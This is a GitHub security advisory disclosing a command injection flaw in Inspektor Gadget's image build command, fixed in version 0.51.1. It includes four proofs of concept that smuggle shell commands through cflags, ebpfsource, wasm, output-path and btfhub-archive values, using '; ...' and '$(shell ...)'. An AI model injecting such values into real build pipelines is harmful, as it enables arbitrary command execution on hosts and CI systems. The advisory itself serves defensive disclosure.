# [M] Inspektor Gadget: Command Injection via malicious buildOptions manipulation

## Summary
Severity: Medium
Advisory: GHSA-79qw-g77v-2vfh
CVE: CVE-2026-24905
CWE: CWE-77, CWE-78
Ecosystem: Go
CVSS: CVSS:4.0/AV:L/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-04-22
Source: https://github.com/advisories/GHSA-79qw-g77v-2vfh
Type: github-advisory

## Affected
- Go: `github.com/inspektor-gadget/inspektor-gadget` — affected >=0 <0.51.1

## Details
### Impacted Resources

`inspektor-gadget/cmd/common/image/build.go`
`inspektor-gadget/cmd/common/image/helpers/Makefile.build`

### Description

The `ig` binary provides a subcommand for image building, used to generate custom gadget OCI images.

A part of this functionality is implemented in the file `inspektor-gadget/cmd/common/image/build.go`.

The following is the code responsible to construct the build command:
```go
func buildCmd(options buildOptions) []string {
	cmd := []string{
		"make", "-f", filepath.Join(options.outputDir, "Makefile.build"),
		"-j", fmt.Sprintf("%d", runtime.NumCPU()),
		"OUTPUTDIR=" + options.outputDir,
		"CFLAGS=" + options.cFlags,
		"FORCE_COLORS=" + options.forceColorsFlag,
	}

	if options.ebpfSourcePath != "" {
		cmd = append(cmd, "EBPFSOURCE="+options.ebpfSourcePath, "ebpf")
	}
	if options.wasmSourcePath != "" {
		cmd = append(cmd, "WASM="+options.wasmSourcePath, "wasm")
	}
	if options.btfgen {
		cmd = append(cmd, "BTFHUB_ARCHIVE="+options.btfHubArchivePath, "btfgen")
	}

	return cmd
}
```

The `Makefile.build` file is the Makefile template employed during the building process.

This file includes user-controlled data in an unsafe fashion, specifically some parameters are embedded without an adequate escaping in the commands inside the Makefile.

This implementation is vulnerable to command injection: an attacker able to control values in the `buildOptions` structure would be able to execute arbitrary commands during the building process.


### Impact

An attacker able to exploit this vulnerability would be able to execute arbitray command: 
- on the Linux host where the `ig` command is launched, if images are built with the `--local` flag
- on the build container invoked by `ig`, if the `--local` flag is not provided

### Attack Complexity

The `buildOptions` structure is extracted from the YAML [gadget manifest](https://inspektor-gadget.io/docs/latest/gadget-devel/building#customizing-your-build) passed to the `ig image build` command. Therefore, the attacker would need a way to control either the full `build.yml` file passed to the `ig image build` command, or one of its options.

Typically, this could happen in a CI/CD scenario that builds untrusted gadgets to verify correctness.

### PoC

#### PoC 1  (Vector: cflags)

1. Create the file `build.yaml` with the following content:
```
ebpfsource: "program.bpf.c"  
metadata: "gadget.yaml"  
cflags: " ; touch poc1.txt ; "
```
2. Create the file `gadget.yaml` with the following content:
```
name: test  
description: test gadget  
```
3. Create the file `program.bpf.c` with the following content:
```
#include <gadget/gadget.h>  
char LICENSE[] SEC("license") = "GPL";
```
4. In the same directory where the files are run the command:
```
ig image build . -t test:latest
```
5. Notice that the file `poc1.txt` gets created inside the directory.

#### PoC2 (Vector: ebpfsource, wasm)

1. Create the file `build.yaml` with the following content:
```
ebpfsource: "$(shell touch poc2-1.txt)"
wasm: "$(shell touch poc2-2.txt)"
```
2. Create the file `$(shell touch poc2-1.txt)`:
```
touch '$(shell touch poc2-1.txt)'
```
3. In the same directory where the files are run the command:
```
ig image build .
```
4. Notice that the files `poc2-1.txt` and `poc2-2.txt` get created inside the directory.

#### PoC3 (Vector: -o, --output)

1. Create the file `build.yaml` with the following content:
```
wasm: dummy.go
```
2. Create the file `gadget.yaml` with the following content:
```
name: test
```
3. Create the directory `$(shell touch poc3.txt)`:
```
touch '$(shell touch poc3.txt)'
```
4. Retrieve the full path of the created directory:
```
readlink -f '$(shell touch poc3.txt)'
```
5. In the same directory where the files are run the command replacing the `<PATH>` placeholder with the value retrieved at step 4:
```
ig image build . --local -o '<PATH>'
```
6. Notice that the file `poc3.txt` gets created inside the directory.

#### PoC4 (Vector: --btfhub-archive)

1. Create the file `build.yaml` with the following content:
```
ebpfsource: test.c
```
2. Create the file `test.c`:
```
touch test.c
```
3. In the same directory where the files are run the command
```
sudo ig image build . --local --btfgen --btfhub-archive $(pwd)/'$(shell touch poc4.txt)'
```
4. Notice that the file `poc4.txt` gets created inside the directory.

### Suggested Remediation

Sanitize build options by providing a robust whitelist to filter on.
Alternatively, revisit the design of image building to prevent shell substitution.

### References

- https://cwe.mitre.org/data/definitions/77.html
- https://cwe.mitre.org/data/definitions/78.html

## References
- https://github.com/inspektor-gadget/inspektor-gadget/security/advisories/GHSA-79qw-g77v-2vfh
- https://nvd.nist.gov/vuln/detail/CVE-2026-24905
- https://github.com/inspektor-gadget/inspektor-gadget/commit/7c83ad84ff7a68565655253e2cf1c5d2da695c1a
- https://github.com/inspektor-gadget/inspektor-gadget/commit/d9bf2fe4a180dad33ce57ca793ff4799ee7b8320
- https://github.com/inspektor-gadget/inspektor-gadget
